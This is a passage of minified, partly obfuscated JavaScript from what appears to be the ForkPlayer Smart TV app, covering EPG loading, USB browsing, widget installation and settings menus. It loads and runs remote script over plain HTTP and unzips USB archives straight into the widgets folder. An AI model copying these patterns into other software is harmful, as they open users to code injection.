if(T.inetTime-c.epg_last>3600000)c.load();page.epgAppend();if(handler!="description")Il01QllQll().focused();if(fEpg.epgInDesc())fEpg.inPlayer()},loadxmltv:function(u,cc){var c=this,x="exec4.remotecurl.appfxml.com/curl";if(u!=null){if(typeof JtvCFxmltv!="undefined"&&JtvCFxmltv[md5(u).substring(0,7)])return;JtvCFxmltv={};JtvEFxmltv={};JtvIMxmltv={};JtvSRC={};var script=document.createElement('script');script.type='text/javascript';script.async=!0;script.src="http://"+x+"/epg.php?do=xmltv&ver=2&cmd=ch&u="+encodeURIComponent(u);maJor.statusbar(u,"link");script.onerror=script.onload=function(){maJor.statusbar("");clearTimeout(c.etst);c.add(cc);Il01QllQll().focused()};document.getElementsByTagName('head')[0].appendChild(script)}},init:function(){var c=this;c.epg_arr=lIlI1VBOOlI01QYpr(maJor.read("epg_set"))||{};c.loadxmltv()}};function jsc_142427789(obj,timer){fEpg.jsc(obj,timer)}
function ScanUsbPort(c){var StoragePlugin=$_('pluginStorage');var nUSBCount=StoragePlugin.GetUSBListSize();var data={"playlist_name":"","channels":[]};if(nUSBCount>0){for(var i=0;i<nUSBCount;i++){var DeviceId=parseInt(StoragePlugin.GetUSBDeviceID(i));var MountPath=StoragePlugin.GetUSBMountPath(DeviceId,0);var usbPath='/dtv/usb/'+MountPath;text=StoragePlugin.GetUSBVendorName(DeviceId)+"<br>"+StoragePlugin.GetUSBModelName(DeviceId)+"<br>"+MountPath;data.channels.push({"title":StoragePlugin.GetUSBVendorName(DeviceId)+" ("+StoragePlugin.GetUSBModelName(DeviceId)+")","description":text,"playlist_url":"usb://"+usbPath})}}else kjtYpr.inf("_FPNoDevices_ USB",1500,"orange");data.channels.push({"title":"_FPTVmemory_","description":"_FPTVmemory_ ТВ","playlist_url":"usb:///mtd_rwcommon/common"});c.parse(l1OOl0I0IASY10lQ10Ypr(data))}
function usbDelete(usbPath){var FilePlugin=$_('pluginObjectFileSystem');if(FilePlugin.IsExistedPath(usbPath))FilePlugin.Delete(usbPath);else{kjtYpr.inf("_FPOshibka_ удаления! "+usbPath,1800);return}
if(FilePlugin.IsExistedPath(usbPath))kjtYpr.inf("_FPOshibka_!",1800);else kjtYpr.inf("_FPDeleted_! "+usbPath,1800)}
var Playlist=new RegExp("\.(m3u|xml|txt)$","i");var Wdg=new RegExp("\.zip$","i");function getUsbList(usbPath,c){usbPath=usbPath.replace("//","/").replace("//","/");var FilePlugin=$_('pluginObjectFileSystem');try{var leftspace="<font color='#EEE'>Свободно в ТВ:</font> "+ToSize(FilePlugin.GetTotalSize()-FilePlugin.GetUsedSize())}catch(e){}
if(Wdg.exec(usbPath)!=null){var name=usbPath.substr(usbPath.lastIndexOf("/")+1).replace(/.zip/i,"");if(FilePlugin.IsExistedPath('/mtd_rwcommon/widgets/user/'+name+'/config.xml')){kjtYpr.inf("_FPVidget_ "+name+" _FPuzheEstVustanovlennih_!",2000,"red")}else{setTimeout(function(){FilePlugin.Unzip(usbPath,'/mtd_rwcommon/widgets/user/'+name+'/');if(FilePlugin.IsExistedPath('/mtd_rwcommon/widgets/user/'+name+'/config.xml')){kjtYpr.inf("_FPVidget_ "+name+" _FPuspeshnoUstanovlen_!",2000,"green");kjtYpr.popUp("_FPViklIvklTVchtobiUv_ "+name+" _FPvSmHubVidgNaidDop_",6000);is_loadpage(0)}else{kjtYpr.inf("_FPOshibkaUstanovki_"+name+" !",2000,"orange")}},300)}
return}
var fileSystemObj=new FileSystem();var arrFiles=fileSystemObj.readDir(usbPath);var data={"channels":[]};if(arrFiles){if(arrFiles.length==2){kjtYpr.inf("_FPPustayaPapka_!",1000);data.channels.push(emptyCh)}
for(var i=2;i<arrFiles.length;i++){if(arrFiles[i].isDir){data.channels.push({"title":arrFiles[i].name,"playlist_url":"usb://"+usbPath+"/"+arrFiles[i].name,"description":arrFiles[i].name})}}
for(var i=2;i<arrFiles.length;i++){if(!arrFiles[i].isDir){if(Playlist.exec(arrFiles[i].name)!=null)
data.channels.push({"title":arrFiles[i].name,"playlist_url":"xml://"+usbPath+"/"+arrFiles[i].name,"description":arrFiles[i].name+"<br>"+ToSize(arrFiles[i].size)+"<br>"+"xml://"+usbPath+"/"+arrFiles[i].name});else if(Wdg.exec(arrFiles[i].name)!=null)
data.channels.push({"logo_30x30":"none","title":"<font color='#FFC600'>"+arrFiles[i].name+"</font>","playlist_url":"usb://"+usbPath+"/"+arrFiles[i].name,"description":"<span style='color:red;'><font color='#EEE'>Установка виджета:</font> "+arrFiles[i].name+"<br><font color='#EEE'>_FPLength_:</font> "+ToSize(arrFiles[i].size)+"<br>"+leftspace+"<br><br>Внимание! Убедитесь что в архиве находится именно виджет для самсунг смарт тв и достаточно свободного места</span>"});else data.channels.push({"title":arrFiles[i].name,"stream_url":""+usbPath+"/"+arrFiles[i].name,"description":arrFiles[i].name+"<br>"+ToSize(arrFiles[i].size)})}}}else{if(arrFiles.length==2){kjtYpr.inf("_FPPustayaPapka_!",1000);c.parse(l1OOl0I0IASY10lQ10Ypr(emptyCh))}}
c.parse(l1OOl0I0IASY10lQ10Ypr(data))}
function TUsbList(dir,c){var data={"channels":[]};if(dir=="/"){tizen.filesystem.listStorages(function(r){for(var i=0;i<r.length;i++){data.channels.push({"title":r[i].label,"playlist_url":"usb:/"+dir+r[i].label,"description":"usb:/"+dir+r[i].label+"<br>"+r[i].type+"<br>"+r[i].state})}
c.parse(l1OOl0I0IASY10lQ10Ypr(data))},function(err){c.parse(JSON.stringify(err))})}else{function onsuccess(files){try{for(var i=0;i<files.length;i++){if(!files[i].isFile){data.channels.push({"title":files[i].name,"playlist_url":"usb:/"+dir+"/"+files[i].name,"description":files[i].name})}}
for(var i=0;i<files.length;i++){if(files[i].isFile){if(Playlist.exec(files[i].name)!=null)
data.channels.push({"logo_30x30":_img('_ST_xmls.png'),"title":files[i].name,"playlist_url":"xml://"+files[i].fullPath,"description":files[i].name+"<br>"+files[i].modified+"<br>"+ToSize(files[i].fileSize)+"<br>"+"xml://"+files[i].fullPath});else if(files[i].name.match(/\.wgt$/))
data.channels.push({"logo_30x30":"","title":"<font color='#FFC600'>"+files[i].name+"</font>","playlist_url":"usb:/"+dir+"/"+files[i].name,"description":"<span style='color:red;'><font color='#EEE'>Установка виджета:</font> "+files[i].name+"<br>"+files[i].modified+"<br>"+ToSize(files[i].fileSize)+"<br><br>Не поддеживается согласно настроек безопасности ТВ"});else if(files[i].name.match(/\.(htm|html)$/))
data.channels.push({"logo_30x30":"","title":"<font color='#FFC600'>"+files[i].name+"</font>","playlist_url":"html://"+files[i].fullPath,"description":"<span style='color:red;'><font color='#EEE'>Открыть html страницу:</font> "+files[i].name+"<br>"+files[i].modified+"<br>"+ToSize(files[i].fileSize)+"<br><br><br>Внимание! ForkPlayer будет закрыт!</span>"});else{data.channels.push({"title":files[i].name,"stream_url":files[i].fullPath,"description":files[i].name+"<br>"+files[i].modified+"<br>"+ToSize(files[i].fileSize)+"<br>"});if(is_img(files[i].fullPath)){data.channels[data.channels.length-1].logo_30x30=files[i].fullPath;data.channels[data.channels.length-1].description='<div id="poster" style="float:left;padding:4px;background-color:#EEEEEE;margin:0px 13px 1px 0px;"><img src="'+files[i].fullPath+'" style="width:180px;float:left;"></div>'+data.channels[data.channels.length-1].description}}}}
c.parse(l1OOl0I0IASY10lQ10Ypr(data))}catch(e){kjtYpr.popUp("ONS="+e.message,2000);c.parse()}}
function onerror(error){is_loadpage(0);c.parse()}
tizen.filesystem.resolve(dir.substr(1),function(dir2){documentsDir=dir2;dir2.listFiles(onsuccess,onerror)},function(e){is_loadpage(0);kjtYpr.popUp(e.message,2000);c.parse()},"r")}}
function ToSize(b){var a=(b>=1073741824)?(b/1073741824)["toFixed"](2)+" ГБ":(b>=1048576)?(b/1048576)["toFixed"](2)+" МБ":(b>=1024)?(b/1024)["toFixed"](2)+" КБ":(b>=0)?b+" Байт":(b<0)?(2+b/1073741824)["toFixed"](2)+" ГБ":"";return a}
function in_array(needle,haystack,strict){var found=!1,key,strict=!!strict;for(key in haystack){if((strict&&haystack[key]===needle)||(!strict&&haystack[key]==needle)){found=!0;break}}
return found}
function parseHtmlEnteties(str){return str.replace(/&#([0-9]{1,4});/gi,function(match,numStr){var num=parseInt(numStr,10);return String.fromCharCode(num)})}
function ip2long(ip){if(ip==null)ip="";var components;if(components=ip.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/)){var iplong=0;var power=1;for(var i=4;i>=1;i-=1){iplong+=power*parseInt(components[i]);power*=256}
return iplong}else return 0}
function sU(u,d){if(u=="")return d;if(d=="")return u;ur=u.split("#POST");dr=d.split("#POST");if(ur[0].indexOf("?")==-1)ur[0]+="?";else ur[0]+="&";ur[0]+=dr[0];if(ur.length>1||dr.length>1){ur[0]+="#POST"+gV(ur[1]);if(gV(ur[1])!=""&&gV(dr[1])!="")ur[0]+="&";ur[0]+=gV(dr[1])}
return ur[0]}
function l0lIIvk1FXOIO01Ypr(url){if(url.indexOf("AddFavorite(")==0){var m=url.match(/AddFavorite\((.*?)\)/)[1];if(m=="")url=gP().lO10111O0001lOl00Ypr;else url=m.split(",")[2]}
if((maJor.read("glstart")+maJor.read("zakladki.xml")+maJor.read("zakladkiSerials.xml")+maJor.read("zakladkiFilms.xml")+maJor.read("zakladkiIPTV.xml")+maJor.read("bookmarks")).indexOf(url)>=0)
return 1;return 0}
function lIQlI1lSe1pI1lQIYpr(url){if(typeof url=="object"){var se=getVars("start").search;for(var i in se.sites){if(url.url==se.sites[i].url)return i;else if(url.logo&&url.title&&url.logo==se.sites[i].logo&&url.title==se.sites[i].title)return i}
return-1}
if(url.indexOf("AddSearch(")==0){var m=url.match(/AddSearch\((.*?)\)/);if(m!=null){url=m[1].split(",")[2]}}
var se=getVars("start").search;for(var i in se.sites){if(url==se.sites[i].url)return i}
return-1}
function getDefaultSE(){var se=getVars("getconfig").search.sites;var d={},ds=-1,max=-1,titles=[];for(var i=0;i<se.length;i++){if(se[i].dop){titles.push(se[i].title)}
if(se[i].dop>max){max=se[i].dop;ds=i}}
if(ds>=0&&typeof se[ds]!="undefined")d=se[ds];d.allse=titles;return d}
var ico_edit='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABcAAAAXCAYAAADgKtSgAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAZdEVYdFNvZnR3YXJlAHBhaW50Lm5ldCA0LjAuMTnU1rJkAAAAhklEQVRIS+3UYQqAIAwFYG/XEbr/RVo+auJyMqdZBD14aTI/+lUgomk9HhPyGRyIgGo4D9Z6TX6W9hq+nWtrcJmLJEzDxYuRfBZ7CQ3g17niXi9uwkgP3gQjXrwZRkZwbU5CHThXi4ScuJUfV/MuvsR6f14cE0fWWBx6WnxQDb8lz+BzSmEH2u1KYK1g5m8AAAAASUVORK5CYII=';function is_ifr(ch){if(Il01QllQll()==null){confirmed.create("Не ждать загрузку данных и открыть стартовую вкладку? Ранее открытые вкладки будут закрыты, настройки будут перезаписаны если их изменить.").fun=[function(){if($_("startlogo"))$_("startlogo").style.display="none";$_("main").style.color=maJor.params.get("color");oInset.push(OeInit(Inset));oInset.renderInset();gotoStart()}]}else return Il01QllQll().is_ifr(ch)}
function getNavU(u){if(gV(u)=="")return"";else if(u.indexOf("curl ")==0){var m=parseCURL(u);u=m.url}
if(u.indexOf("#POST")>0)u=u.split("#POST")[0];if(u.match(/^searchEngines(#url|xml)?\|/))u=u.split("|")[2];var matches=u.match(/^(https?:\/\/)([^:\/]+):([^@\/]+)@/);if(matches)u=u.replace(matches[0],matches[1]+"***@");return u}
function breakScreen(u){$_("navigate",'<span id="navinfo2" style="color: #a9abac;font-size: 18px; padding: 5px;display:none;">'+gV($_("navinfo2"),"innerHTML")+'</span>'+"<span id='navurl'>"+getNavU(u)+"</span>");if($_("description")){$_("description").style.display="none";$_("description","")}
if($_("content"))$_("content","");maJor.sethash()}
function setVars(f,n){if(f=="search"){var nn=getVars("start");nn.search=n;f="start";n=nn}
if(f=="start"){var ke=["before","br","id"];for(var i in n.fav){if(n.fav[i]==null)delete n.fav[i];else{for(var j in ke){if(typeof n.fav[i][ke[j]]!="undefined")delete n.fav[i][ke[j]]}}}
var np={"config":n.config,"fav":n.fav,"search":n.search};if(typeof n.hidetop!="undefined")np.hidetop=n.hidetop;maJor.write("glstart",l1OOl0I0IASY10lQ10Ypr(np))}}
function delDupl(ch1,ch2){var ex="|";for(i=0;i<ch1.length;i++)ex+=gV(ch1[i],"playlist_url")+""+gV(ch1[i],"stream_url")+"|";for(i=0;i<ch2.length;i++){if(ex.indexOf("|"+gV(ch2[i],"playlist_url")+""+gV(ch2[i],"stream_url")+"|")>=0){ch2.splice(i,1);i--}else{ex+=gV(ch2[i],"playlist_url")+gV(ch2[i],"stream_url")+"|"}}
return ch2}
function shuffleArray(arr){for(var i=arr.length-1,j,temp;i>6;i--){j=Math.floor(Math.random()*(i-6))+6;temp=arr[i];arr[i]=arr[j];arr[j]=temp}
return arr}
function getLastRek(ch){var rekgrid=[];var lastgrid=[];if(userGrid!=null){var subArray=[];maJor.each(userGrid.vhist,function(val){if(ch.hidetop&&ch.hidetop[val.playlist_url])return;if(!is_xxx(val)&&lastgrid.length<9){val.playlist_url=String(maJor.parsers.link(val.playlist_url));lastgrid.push(val)}});if(userGrid.plrek)for(var i=0;i<userGrid.plrek.length;i++){subArray.push(userGrid.plrek[i])}
shuffleArray(subArray);maJor.each(subArray,function(val){if(!is_xxx(val)&&rekgrid.length<9){val.playlist_url=String(maJor.parsers.link(val.playlist_url));rekgrid.push(val)}});if(rekgrid.length>0)rekgrid[rekgrid.length-1]={"title":"Другие рекомендации...","template":"<div style=\"width:113px;height:207px;text-align:left;margin:3px 6px;font-size: 17px;line-height: 17px;overflow: hidden;\"><div style=\"position: absolute;text-align: left;margin-left: -6px;width: 108px;overflow: hidden;text-overflow: ellipsis;\">$description</div><img src=\"$logo_30x30\" style=\"height:170px;width:113px;\"><div style=\"max-height: 34px;overflow: hidden;\">  $title</div> </div>","logo_30x30":maJor.parsers.link()+"icons/next.png","playlist_url":maJor.parsers.link()+"VilkaDB/?id=mywatching&from=rek"}}
ch.vilka_last=lastgrid;ch.vilka_rek=rekgrid;return ch}
function getTop(ch){var tmp={},ctop=[];for(var i in maJor.userTop){var z=""+maJor.userTop[i].c;while(z.length<10)z="0"+z;var k=z+gV(maJor.userTop[i],"tp")+i;tmp[k]={"playlist_url":i};for(var j in maJor.userTop[i])tmp[k][j]=maJor.userTop[i][j]}
function ksort(obj){var keys=[],sortedObj={};for(k in obj){if(obj.hasOwnProperty(k)){keys.push(k)}}
keys.sort();len=keys.length;for(i=len-1;i>=0;i--){sortedObj[keys[i]]=obj[keys[i]]}
return sortedObj}
tmp=ksort(tmp);var nx=0,fe="";for(var i in tmp){fe=tmp[i].playlist_url;if(tmp[i].c>5)ctop.push({"source":"usertop","c":tmp[i].c,"title":tmp[i].title,"description":""+getInfoUrl(tmp[i].playlist_url),"logo_30x30":tmp[i].logo_30x30,"playlist_url":tmp[i].playlist_url,"parser":tmp[i].parser});if(nx++>100){delete maJor.userTop[fe]}}
var deftop=lIlI1VBOOlI01QYpr(cached.start);if(deftop!=null){for(var i in deftop.channels){ctop.push(deftop.channels[i])}}
if(parseInt(maJor.params.get("third"))!=1){for(var i=0;i<ctop.length;i++)if(gV(ctop[i],"source")=="third"){ctop.splice(i,1);i--}}
var defgrid=[];var np=Math.ceil(4*(ch.config.best/3));if(userGrid!=null){try{var brgrid=1;maJor.each(userGrid.stlast,function(val){if(!is_xxx(val)&&defgrid.length<np){if(ch.hidetop&&ch.hidetop.submenu)return;if(gV(val,"play_url")!=""&&gV(val,"play_url")!=gV(val,"stream_url")){var el=lIlI1VBOOlI01QYpr(l1OOl0I0IASY10lQ10Ypr(val));var el2=lIlI1VBOOlI01QYpr(l1OOl0I0IASY10lQ10Ypr(val));el.display_title=el.title=gV(val,"parser")+val.stream_url;el.position="list";el2.display_title=el2.title=el2.stream_url=el2.play_url;el2.parser="";el2.position="list";if(typeof val.menu!="object")val.menu=[];var tch={"title":val.title,"logo_30x30":val.logo_30x30,"playlist_url":"submenu","submenu":[el,el2]}}else tch=val;tch.menu=[val.menu[0],{"title":val.time+" ago","playlist_url":"http://cloudflare.appfxml.com/browseraccount/?do=grid&type=stlast"}];if(brgrid){tch.br=1;brgrid=0}else tch.br=0;defgrid.push(tch)}});var ex="";maJor.each(userGrid.pllast,function(val){if(!is_xxx(val.ch)&&defgrid.length<2*np){if(ch.hidetop&&ch.hidetop[val.ch.playlist_url])return;val.ch.menu=[{"title":val.time+" ago","playlist_url":"http://cloudflare.appfxml.com/browseraccount/?do=grid&type=pllast"}];if(brgrid){val.ch.br=1;brgrid=0}else val.ch.br=0;defgrid.push(val.ch);ex+=val.ch.playlist_url+"..."}});maJor.each(userGrid.pltop,function(val){if(!is_xxx(val.ch)&&defgrid.length<5*np&&ex.indexOf(val.ch.playlist_url+"...")==-1){if(ch.hidetop&&ch.hidetop[val.ch.playlist_url])return;val.ch.menu=[{"title":val.time+" назад. "+val.c+" раз","playlist_url":"http://cloudflare.appfxml.com/browseraccount/?do=grid&type=pltop"}];if(brgrid){val.ch.br=1;brgrid=0}else val.ch.br=0;defgrid.push(val.ch)}})}catch(e){kjtYpr.popUp("Error user grid "+e.message,1500)}}
ctop=delDupl(ch.fav,ctop);ctop=delDupl(ch.service,ctop);ctop=delDupl(defgrid,ctop);var ctop2=[];for(var i=0;i<defgrid.length;i++){ctop2.push(defgrid[i])}
for(var i=0;i<ctop.length;i++){if(ch.hidetop&&ch.hidetop[gV(ctop[i],"playlist_url")+gV(ctop[i],"stream_url")])continue;else ctop2.push(ctop[i])}
ctop=ctop2;for(var i=0;i<ctop.length;i++)if(i>=ch.config.best*9){ctop.splice(i,1);i--}
return ctop}
function pluralize(i,s){return i+" "+(i===1?s+"а":i>=2&&i<=4?s+"и":s)}
function getVars(n,pq){if(n.indexOf("about:info")==0){var data={"align":"		ft","title":"<b>Контакты и Условия использования</b>","channels":[{"title":"Назад","playlist_url":"cmd:historyback(-2);","position":"hlink"}]};data.before="<div style='margin: 20px auto;width: 90%;background: #586367;padding: 10px; border-radius: 5px;font-size:80%;'>"+"Добро пожаловать! Это кроссплатформенное приложение для создания настраиваемых мультимедийных страниц. Оно не содержит контента  и представляет собой так называемое приложение White Label, предназначеное для создания своего контента или использования контента от других авторов. Весь контент написан в формате JSON, XML или M3U с простой и удобной структурой. Созданные файлы страниц размещаются на любом HTTP-сервере, поддерживающем CORS.<br>"+"<br>"+"Данное приложение также может использоваться для просмотра страниц, написанных на языке разметки FXML, а также для просмотра файлов плейлистов, изображений, аудио-видео форматов и потокового видео.<br>"+"<br>"+"Вы можете создавать простые или сложные медиа-страницы, используя исходный код или системы управления содержимым (CMS). Легко перемещайтесь по этим страницам с помощью пульта дистанционного управления или указателя. Воспроизведение нескольких видео/аудиофайлов в списке воспроизведения и показ нескольких изображений в слайд-шоу также доступны. Вы можете продолжать просмотр видео или прослушивание аудиофайла, одновременно просматривая другие страницы мультимедиа, и открывать ссылки в полноэкранном режиме.<br>"+"<br>"+"Это приложение не несет ответственности за контент, созданный сторонними авторами, и не выступает в его поддержку.<br>"+"<span style='color:yellow;'>Сообщества поддержки приложения:<br>"+"https://t.me/forkplayertv (7 тыс. участников)<br>https://t.me/ForkPlayer (1 тыс. участников)<br>https://t.me/Pro_ForkPlayer (8 сот. участников)<br>https://t.me/fork_player (2 сот. участников)<br>"+"VK: https://vk.com/smarttv_ru<br></span>"+"</div>"}else if(n.indexOf("about:yoursearchEngines")==0){var data={"title":"_FPNaitiVglobPoiske_"};data["chan"+"nels"]=[];if(Il01QllQll().history.length>1){var ttl=nmlz(Il01QllQll().history[Il01QllQll().history.length-1].title).split(" ");var s="";for(var i=0;i<ttl.length;i++){s+=ttl[i];if(i<ttl.length-1)s+=" ";data["chan"+"nels"].unshift({"logo_30x30":_img("_ST_search.png"),"title":s,"playlist_url":"searchEngines|"+s})}}
var title=n.split("yoursearchEngines|")[1];ttl=nmlz(title.replace(/\s+/g," ")).split(" ");if(title.indexOf("<div")==0){ttl=title.match(/nowrap;'>(.*?)</)[1].replace(/("|'|т\/c|х\/ф|,|Т\/с|Х\/ф)/ig," ").replace(/\s+/g," ").split(" ")}
var s="";for(var i=0;i<ttl.length;i++){if(ttl[i]==" "||ttl[i]=="")continue;s+=ttl[i];if(i<ttl.length-1)s+=" ";data["chan"+"nels"].unshift({"logo_30x30":_img("_ST_search.png"),"title":s,"playlist_url":"searchEngines|"+s})}
var ort=ttl.join(" ");if(ort.indexOf("Сезон")>=0){var mtc=ort.match(/сезон.*?- (.*)/i);if(mtc!=null){s=mtc[1];data["chan"+"nels"].unshift({"logo_30x30":_img("_ST_search.png"),"title":s,"playlist_url":"searchEngines|"+s})}}
return data}else if(n.indexOf("about:settings")==0){var se=getVars("getconfig");var c=n.replace(/^.*?#/,"").replace(/\?.*$/,"");if(c){var d=c.split(":");if(d[0]=="clear"){maJor.write(d[1],"");kjtYpr.inf("Clear "+d[1]+" OK!",1300);maJor.readDef(d[1])}
if(d[0]=="setconfig"){if(d[1]=="defstart"){delete se.config;delete se.fav;delete se.hidetop;maJor.write("datas","");maJor.readDef("datas");setVars("start",se);se=getVars("start");maJor.params.set(["focus","tile","font","color","tileurl","tileiconheight","tiletitleheight"],"");maJor.params.save();kjtYpr.inf("OK!",1300)}else if(d[1]=="clearhide"){delete se.hidetop;setVars("start",se);kjtYpr.inf("OK!",1300)}else if(d[1]=="order"){if(exinobj(se.config.order,d[2])){maJor.each(se.config.order,function(val,ii){if(d[2]==val)se.config.order.splice(ii,1)})}else{var x=0;for(var i in startL){if(startL[i]==d[2])break;if(exinobj(se.config.order,startL[i]))x++}
se.config.order.splice(x,0,d[2])}
setVars("start",se)}else{if(d[2]==1||d[2]==0)d[2]=parseInt(d[2]);se.config[d[1]]=d[2];setVars("start",se)}
if(gP().lO10111O0001lOl00Ypr=="about:blank"){Il01QllQll().reload();return}}else if(d[0]=="reset"){confirmed.create("_FPSbrositNastr_ _FPprilozheniya_?<br>_FPVsaeZaklUd_!? ").fun=[function(){sbrosok()}];return}else{if(d.length>3){var d=[d[0],d[1],d.splice(2).join(":")]}
if(d[2]=="manual"&&d[1]!="player"&&d[1]!="streamplayer"){d[2]=pq.inputed.text;VK.close(1)}
maJor.params.set(d[1],d[2]);if(d[1]=="ver")kjtYpr.inf("_FPRestart the app to change the version now_",1300);if(d[1]=="remoteip")maJor.params.set("remote",3);if(d[1].match(/(remote|torrserve|acestream)/)){maJor.Remote.init();if(getSelect()==-1)return}
if(d[1].match(/(pr|sidebar|color|font|fon)/))FXMLPage.l1I1IQlO1ZkV1IOOOllYpr();if(d[1].match(/zoom/))FXMLPage.setZoom(1);if(d[1]=="JTVRegion"&&gP("lO10111O0001lOl00Ypr").indexOf("about:settings")!==0){gP().renderChannels(getSelect(),"update");return}}
maJor.setHandler("menu")}
if(maJor.virtual)var vtt="<img align=right height=12 style='margin: 1px 0px 0px 2px;' src='"+_img("_ST_untrust.png")+"' title='Информация об идентификаторе берется с памяти и может меняться, например при сбросе тв к заводским или обновлении ПО' >";else vtt="<img align=right height=12 style='margin: 1px 0px 0px 2px;' src='"+_img("_ST_trust.png")+"' title='Информация об идентификаторе берется с характеристик ТВ (мак адрес или androidid), менятся может при смене типа подключения' >";var ch=[];var m=[];for(var i in _lang)m.push({"title":i+" "+_lang[i]._name,"playlist_url":"about:settings#set:lang:"+i});if(!_lang[maJor.params.get('lang')])maJor.params.set('lang',"ru");ch.push({"title":"Language",logo:"translate","description":maJor.params.get('lang')+" "+_lang[maJor.params.get('lang')]._name+" &#9660;","template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});ch.push({"title":"",logo:"devices","description":"_FPSet name_","search_on":"search_on","value":maJor.params.get('name'),"playlist_url":"about:settings#set:name:manual","template":tmpl_box,"position":"html"});m=[];for(var i=-11;i<=11;i++){var t=new Date(T.inetTime+i*3600000);var dstring=to(t.getHours(),t.getMinutes());m.push({"title":dstring,"playlist_url":"about:settings#set:JTVRegion:"+i})}
ch.push({"title":"_FPTime offset_",logo:"schedule","description":((maJor.params.get('JTVRegion')>0)?"+"+maJor.params.get('JTVRegion'):maJor.params.get('JTVRegion'))+" &#9660;","template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":"_FPStartovoeMenu_","playlist_url":"about:settings#set:recovery:0"},{"title":"_FPPrRabStogoMesta_","playlist_url":"about:settings#set:recovery:1"}];ch.push({"title":"_FPNachGrupa_",logo:"home","description":(maJor.params.get('recovery')?"_FPPrRabStogoMesta_":"_FPStartovoeMenu_")+" &#9660;","template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});if(maJor.user)m=[{"title":shint(30)+" & User sync","playlist_url":"about:settings#set:ts:0"},{"title":shint(29),"playlist_url":"about:settings#set:ts:-1"},{"title":shint(31),"playlist_url":"about:settings#set:ts:1"}];else m=[{"title":shint(30),"playlist_url":"about:settings#set:ts:0"},{"title":shint(31),"playlist_url":"about:settings#set:ts:1"}];ch.push({"title":"_FPStore data_","description":shint(30+maJor.params.get('ts'))+" &#9660;",logo:"save","template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(0),"playlist_url":"about:settings#set:adult:0"},{"title":shint(1),"playlist_url":"about:settings#set:adult:1"}];ch.push({"br":1,"title":"_FPAdult content_","description":shint(maJor.params.get("adult")),logo:"lock","is_parent_lock":1,"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(0),"playlist_url":"about:settings#set:passwordkey:"},{"title":"_FPVvedNov_ _FPParol_","search_on":"search_on","type":"password","playlist_url":"about:settings#set:passwordkey:manual"}];ch.push({"is_parent_lock":1,"title":"_FPRodKontr_","description":shint(maJor.params.get('passwordkey'),"p")+" &#9660;",logo:"lock_person","template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":"Fork _FPkeyboard_","playlist_url":"about:settings#set:keyboard:"},{"title":"_FPsystem_","playlist_url":"about:settings#set:keyboard:system"}];ch.push({"title":"_FPKeyboard_","description":(maJor.params.get('keyboard')?"_FP"+maJor.params.get('keyboard')+"_":"Fork _FPkeyboard_")+" &#9660;",logo:"keyboard","template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[];var titleVersions={"old":"Устаревшая! Не рекомендуется","oldstable":"_FPOld stable_","stable":"_FPLatest stable_","beta":"_FPLatest beta_"};maJor.each(librarys.versions(),function(v,i){m.push({"title":v+" "+gVs(titleVersions,i),"playlist_url":"about:settings#set:ver:"+(i=="beta"?i:v)})});ch.push({"title":"Fork version","description":maJor.params.get('ver')+" &#9660;",logo:"info","template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});var winfo=maJor.params.get('weather');if(winfo==-1)winfo="Отключено";else if(winfo==0)winfo="Город: Автоматически";else if(winfo)winfo="Город: "+winfo;ch.push({"title":"_FPAdjust weather_","description":winfo,logo:"cloud","template":tmpl_box,"position":"html","playlist_url":"http://cloudflare.appfxml.com/browseraccount/?do=weather&id=set"});var br=1;var bef="<div class='settile'>_FPStart Page_</div>";for(var i in startL){var def=exinobj(se.config.order,startL[i]);ch.push({"br":br,before:bef,"title":startN[startL[i]],"template":tmpl_box,"position":"html","logo_30x30":"http://check"+(def?"true":"false"),"description":"","playlist_url":"about:settings#setconfig:order:"+startL[i]+":"+(def?"0":"1")});if(i==4)br=1;else br=0;bef=""}
ch.push({"template":tmpl_box,"position":"html",logo:"manage_search","title":"_FPYour search engines_","playlist_url":"about:configsearch"});m=[];for(var i=0;i<=5;i++)m.push({"title":pluralize(i,"строк"),"playlist_url":"about:settings#setconfig:best:"+i});ch.push({"template":tmpl_box,"position":"html",logo:"thumb_up","title":"_FPRecommendation_","description":""+pluralize(se.config.best,"строк"),"playlist_url":"menu","menu":m});ch.push({"template":tmpl_box,"position":"html",logo:"delete_sweep","title":"_FPClear recommendation_","description":"_FPLength_: "+maJor.flength("datas"),"playlist_url":"about:settings#clear:datas"});ch.push({"br":1,"template":tmpl_box,"position":"html",logo:"delete_forever","title":"_FPОчистить просмотренное_","description":"_FPLength_: "+maJor.flength("times"),"playlist_url":"about:settings#clear:times"});if(typeof se.hidetop=="object"){var dop=0;for(var i in se.hidetop)dop++;ch.push({"template":tmpl_box,"position":"html",logo:"settings","title":"Восстановить скрытые рекоммендации","description":"Скрытые URL: "+dop,"playlist_url":"about:settings#setconfig:clearhide"})}
m=[{"title":"_FPRecommendation_","playlist_url":"about:settings#setconfig:besttop:1"},{"title":"_FPFavorites_","playlist_url":"about:settings#setconfig:besttop:0"}];ch.push({"template":tmpl_box,"position":"html",logo:"menu_open","title":"_FPSetDefaultStartMenu_?","description":"","playlist_url":"confirm","confirm":["about:settings#setconfig:defstart"]});m=[];maJor.each(maJor.getPlayer().v,function(i){m.push({"title":i.title,"playlist_url":"about:settings#set:player:"+i.name})});ch.push({"br":1,"before":"<div class='settile'>_FPVideo & Audio_</div>",logo:"smart_display","title":"_FPVideopleer_","description":maJor.getPlayer().player.title,"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[];maJor.each(maJor.getPlayer().s,function(i){m.push({"title":i.title,"playlist_url":"about:settings#set:streamplayer:"+i.name})});ch.push({"title":"IPTV+HLS _FPpleer_","description":maJor.getPlayer().streamplayer.title,"template":tmpl_box,"position":"html",logo:"tv","playlist_url":"menu","menu":m});m=[];for(var i in 